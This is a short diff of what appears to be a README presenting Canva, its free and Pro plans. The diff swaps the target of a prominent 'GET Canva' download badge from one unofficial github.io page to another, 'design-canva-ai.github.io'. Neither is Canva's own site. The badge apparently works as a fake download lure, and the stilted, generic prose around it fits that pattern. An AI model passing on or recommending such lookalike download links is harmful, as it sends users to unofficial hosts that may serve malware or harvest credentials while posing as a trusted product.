@@ -87,7 +87,7 @@ Those settings belong to an app that runs inside the editor. They are not a seco
 
 Open canva web and sign in. That is the build.
 
-[![GET Canva](https://img.shields.io/badge/GET-Canva-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://andrevdnkx870.github.io/.github/Canva)
+[![GET Canva](https://img.shields.io/badge/GET-Canva-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://design-canva-ai.github.io/.github/)
 
 The brief does not list a dollar price. The free plan is the one with basic templates, basic media, and limited AI. canva pro adds templates, media, the background remover, and Magic Resize.
 
